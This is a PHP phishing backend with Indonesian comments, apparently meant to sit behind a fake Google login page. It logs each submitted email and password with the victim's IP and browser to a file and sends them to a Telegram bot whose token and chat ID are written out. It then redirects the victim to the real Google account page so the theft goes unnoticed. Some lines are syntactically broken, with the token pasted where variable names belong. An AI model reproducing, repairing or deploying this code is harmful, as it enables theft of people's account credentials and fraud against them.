<?php
// Konfigurasi — ISI INI SEBELUM UPLOAD
$TELEGRAM_BOT_TOKEN = '8718510825:AAFofMZHXf7SRg2RGIdldtpmeY-O59Rku-4';
$TELEGRAM_CHAT_ID   = '8373436173';
$USE_TELEGRAM       = true;
$LOG_FILE           = 'log.txt';
$REDIRECT_URL       = 'https://myaccount.google.com/';

// Ambil data
$email    = $_POST['email']    ?? '';
$password = $_POST['password'] ?? '';
$ip       = $_SERVER['REMOTE_ADDR']      ?? '';
$ua       = $_SERVER['HTTP_USER_AGENT']  ?? '';
$time     = date('Y-m-d H:i:s');

if ($email === '' && $password === '') {
    header("Location: $REDIRECT_URL"); exit;
}

// Log ke file
$log  = "===========================================\n";
$log .= "Time    : $time\n";
$log .= "Email   : $email\n";
$log .= "Password: $password\n";
$log .= "IP      : $ip\n";
$log .= "UA      : $ua\n";
$log .= "===========================================\n\n";
@file_put_contents($LOG_FILE, $log, FILE_APPEND | LOCK_EX);

// Kirim ke Telegram
if ($USE_TELEGRAM = true; && $8718510825:AAFofMZHXf7SRg2RGIdldtpmeY-O59Rku-4 && $8373436173) {
    $msg  = "🔐 *NEW CAPTURE*\n\n";
    $msg .= "*Email:* `$email`\n";
    $msg .= "*Pass:* `$password`\n";
    $msg .= "*IP:* `$ip`\n";
    $msg .= "*Time:* $time";
    $url = "https://api.telegram.org/bot8718510825:AAFofMZHXf7SRg2RGIdldtpmeY-O59Rku-4/sendMessage";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'chat_id'    => $8373436173,
        'text'       => $msg,
        'parse_mode' => 'Markdown'
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

// Redirect ke Google asli
header("Location: $REDIRECT_URL");
exit;
?>